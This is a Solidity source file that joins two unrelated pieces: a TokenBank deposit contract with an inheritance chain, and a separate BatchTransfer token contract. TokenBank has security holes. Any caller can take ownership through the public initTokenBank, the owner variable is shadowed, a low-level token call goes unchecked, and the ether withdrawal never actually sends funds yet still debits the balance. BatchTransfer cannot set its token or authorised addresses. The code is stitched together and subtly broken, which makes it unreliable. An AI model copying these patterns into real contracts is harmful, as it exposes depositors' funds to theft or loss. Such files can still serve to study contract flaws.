 

pragma solidity ^0.4.18;

contract Ownable
{
    address newOwner;
    address owner = msg.sender;
    
    function changeOwner(address addr)
    public
    onlyOwner
    {
        newOwner = addr;
    }
    
    function confirmOwner() 
    public
    {
        if(msg.sender==newOwner)
        {
            owner=newOwner;
        }
    }
    
    modifier onlyOwner
    {
        if(owner == msg.sender)_;
    }
}

contract Token is Ownable
{
    address owner = msg.sender;
    function WithdrawToken(address token, uint256 amount,address to)
    public 
    onlyOwner
    {
         
        token.call(bytes4(sha3("transfer(address,uint256)")),to,amount); 
    }
}

contract TokenBank is Token
{
    uint public MinDeposit;
    mapping (address => uint) public Holders;
    
      
    function initTokenBank()
    public
    {
        owner = msg.sender;
        MinDeposit = 1 ether;
    }
    
    function()
    payable
    {
        Deposit();
    }
   
    function Deposit() 
    payable
    {
        if(msg.value>=MinDeposit)
        {
            Holders[msg.sender]+=msg.value;
        }
    }
    
    function WitdrawTokenToHolder(address _to,address _token,uint _amount)
    public
    onlyOwner
    {
        if(Holders[_to]>0)
        {
            Holders[_to]=0;
            WithdrawToken(_token,_amount,_to);     
        }
    }
   
    function WithdrawToHolder(address _addr, uint _wei) 
    public
    onlyOwner
    payable
    {
        if(Holders[msg.sender]>0)
        {
            if(Holders[_addr]>=_wei)
            {
                 
                _addr.call.value(_wei);
                Holders[_addr]-=_wei;
            }
        }
    }
    
    function Bal() public constant returns(uint){return this.balance;}
}
contract ERC20 {
    function balanceOf(address user) public view returns (uint256);
    function allowance(address user, address spender) public view returns (uint256);
    function transferFrom(address from, address to, uint256 value) public returns (bool); 
}

contract BatchTransfer {
    address private _erc20_address;
    mapping(address => bool) private _authed_addresses;

    modifier onlyAuthed() {
        require(_authed_addresses[msg.sender], "require auth permission");
        _;
    }

    function transferFrom(address token_holder, address[] token_receivers, uint256[] values) public onlyAuthed returns (bool) {
        require(token_receivers.length == values.length, "token_receiver's size must eq value's size");
        require(token_receivers.length > 0, "token_receiver's length must gt 0");
        
        uint length = token_receivers.length;

        uint i = 0;
        uint value = 0;
        uint total_value = 0;

        for(i = 0; i < length; ++i) {
            value = values[i];
            require(value > 0, "value must gt 0");
            total_value += value;
        }
        
        ERC20 token_contract = ERC20(_erc20_address);
        uint256 holder_balance = token_contract.balanceOf(token_holder);
        require(holder_balance >= total_value, "balance of holder must gte total_value");
        uint256 my_allowance = token_contract.allowance(token_holder, this);
        require(my_allowance >= total_value, "allowance to contract must gte total_value");

        for(i = 0; i < length; ++i) {
            address token_receiver = token_receivers[i];
            value = values[i];
            bool is_success = token_contract.transferFrom(token_holder, token_receiver, value);
            require(is_success, "transaction should be success");
        }

        return true;
    }
}
